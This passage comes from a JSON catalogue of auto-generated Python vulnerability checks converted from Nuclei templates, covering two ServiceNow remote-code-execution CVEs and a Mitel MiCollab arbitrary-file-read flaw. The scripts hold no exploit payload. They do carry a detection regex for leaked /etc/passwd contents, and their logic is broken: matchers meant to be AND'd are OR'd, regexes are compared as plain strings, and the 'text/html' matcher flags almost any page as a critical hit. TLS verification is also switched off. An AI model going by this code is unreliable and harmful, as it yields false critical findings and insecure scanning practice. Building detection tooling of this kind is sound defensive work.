 def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"ServiceNow UI Macros - Template Injection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2024_4879(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2024-4879\nName: ServiceNow UI Macros - Template Injection\nSeverity: critical\nDescription: ServiceNow has addressed an input validation vulnerability that was identified in Vancouver and Washington DC Now Platform releases. This vulnerability could enable an unauthenticated user to remotely execute code within the context of the Now Platform. ServiceNow applied an update to hosted instances, and ServiceNow released the update to our partners and self-hosted customers. Listed below are the patches and hot fixes that address the vulnerability. If you have not done so already, we recommend applying security patches relevant to your instance as soon as possible.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2024_4879:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2024-4879\"\n    SEVERITY = \"critical\"\n    NAME = \"ServiceNow UI Macros - Template Injection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[AND] mot(s) \\'<div class=\"outputmsg_text\">1787569</div>\\' | mot(s) \\'text/html\\' | status HTTP [200]'\n\n        # Simple word matcher simulation\n        matchers = ['<div class=\"outputmsg_text\">1787569</div>', 'text/html']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"ServiceNow UI Macros - Template Injection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2024_4879(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "cve",
          "cve2024",
          "servicenow",
          "ssti",
          "kev",
          "vkev",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_c_v_e_2024_5217",
        "name": "ServiceNow - Incomplete Input Validation",
        "language": "Python",
        "famille": "CVE",
        "description": "ServiceNow has addressed an input validation vulnerability that was identified in the Washington DC, Vancouver, and earlier Now Platform releases. This vulnerability could enable an unauthenticated user to remotely execute code within the context of the Now Platform. The vulnerability is addressed in the listed patches and hot fixes below, which were released during the June 2024 patching cycle. If you have not done so already, we recommend applying security patches relevant to your instance as soon as possible.",
        "severity": "critical",
        "detection": "[AND] mot(s) 'glide.db.user' | mot(s) 'text/html' | status HTTP [200]",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2024-5217\nName: ServiceNow - Incomplete Input Validation\nSeverity: critical\nDescription: ServiceNow has addressed an input validation vulnerability that was identified in the Washington DC, Vancouver, and earlier Now Platform releases. This vulnerability could enable an unauthenticated user to remotely execute code within the context of the Now Platform. The vulnerability is addressed in the listed patches and hot fixes below, which were released during the June 2024 patching cycle. If you have not done so already, we recommend applying security patches relevant to your instance as soon as possible.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2024_5217:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2024-5217\"\n    SEVERITY = \"critical\"\n    NAME = \"ServiceNow - Incomplete Input Validation\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'glide.db.user' | mot(s) 'text/html' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['glide.db.user', 'text/html']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"ServiceNow - Incomplete Input Validation\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2024_5217(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2024-5217\nName: ServiceNow - Incomplete Input Validation\nSeverity: critical\nDescription: ServiceNow has addressed an input validation vulnerability that was identified in the Washington DC, Vancouver, and earlier Now Platform releases. This vulnerability could enable an unauthenticated user to remotely execute code within the context of the Now Platform. The vulnerability is addressed in the listed patches and hot fixes below, which were released during the June 2024 patching cycle. If you have not done so already, we recommend applying security patches relevant to your instance as soon as possible.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2024_5217:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2024-5217\"\n    SEVERITY = \"critical\"\n    NAME = \"ServiceNow - Incomplete Input Validation\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'glide.db.user' | mot(s) 'text/html' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['glide.db.user', 'text/html']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"ServiceNow - Incomplete Input Validation\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2024_5217(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "cve",
          "cve2024",
          "servicenow",
          "rce",
          "kev",
          "vkev",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_c_v_e_2024_55550",
        "name": "Mitel MiCollab - Arbitary File Read",
        "language": "Python",
        "famille": "CVE",
        "description": "The Mitel Collab Arbitrary File Read vulnerability allows an unauthenticated attacker to read arbitrary files from the underlying file system on a Mitel Collab server. Exploiting this flaw involves sending specially crafted requests to the server, bypassing access controls and allowing the attacker to retrieve sensitive files.",
        "severity": "critical",
        "detection": "[AND] mot(s) 'users, Network Element' / [AND] regex ['root:.*:0:0:', 'micollab_api:.*:.*']",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2024-55550\nName: Mitel MiCollab - Arbitary File Read\nSeverity: critical\nDescription: The Mitel Collab Arbitrary File Read vulnerability allows an unauthenticated attacker to read arbitrary files from the underlying file system on a Mitel Collab server. Exploiting this flaw involves sending specially crafted requests to the server, bypassing access controls and allowing the attacker to retrieve sensitive files.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2024_55550:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2024-55550\"\n    SEVERITY = \"critical\"\n    NAME = \"Mitel MiCollab - Arbitary File Read\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'users, Network Element' / [AND] regex ['root:.*:0:0:', 'micollab_api:.*:.*']\"\n\n        # Simple word matcher simulation\n        matchers = ['users, Network Element', 'root:.*:0:0:', 'micollab_api:.*:.*']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Mitel MiCollab - Arbitary File Read\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2024_55550(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2024-55550\nName: Mitel MiCollab - Arbitary File Read\nSeverity: critical\nDescription: The Mitel Collab Arbitrary File Read vulnerability allows an unauthenticated attacker to read arbitrary files from the underlying file system on a Mitel Collab server. Exploiting this flaw involves sending specially crafted requests to the server, bypassing access controls and allowing the attacker to retrieve sensitive files.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2024_55550:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2024-55550\"\n    SEVERITY = \"critical\"\n    NAME = \"Mitel MiCollab - Arbitary File Read\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'users, Network Element' / [AND] regex ['root:.*:0:0:', 'micollab_api:.*:.*']\"\n\n        # Simple word matcher simulation\n        matchers = ['users, Network Element', 'root:.*:0:0:', 'micollab_api:.*:.*']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        